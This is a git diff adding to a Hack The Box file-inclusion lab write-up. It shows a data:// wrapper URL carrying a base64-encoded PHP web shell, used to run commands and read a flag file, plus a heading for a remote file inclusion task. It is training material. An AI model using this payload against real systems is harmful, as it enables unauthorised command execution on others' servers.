@@ -40,3 +40,9 @@ Using <code> echo "encoded text" | base64 -d</code> we can decode text and find 
 <h1><ins>PHP Wrappers</ins></h1>
 <h2>Task: Try to gain RCE using one of the PHP wrappers and read the flag at /</h2>
 
+After going throught HTB Writeup we can see that <code>http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</code> show UID's we can use last part <code>cmd=id</code> to pass commands which in this case we can change to <code>cmd=ls /</code> to find our flag file which is <code>37809e2f8952f06139011994726d9ef1.txt</code> knowing this we can change our last part of the code to get flag <code>cmd=cat /37809e2f8952f06139011994726d9ef1.txt</code>
+
+![1](https://github.com/user-attachments/assets/6e1c7ccf-33f8-4393-99c6-6d40eca727f5)
+
+<h1><ins>Remote File Inclusion (RFI)</ins></h1>
+<h2>Task: Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in/</h2>
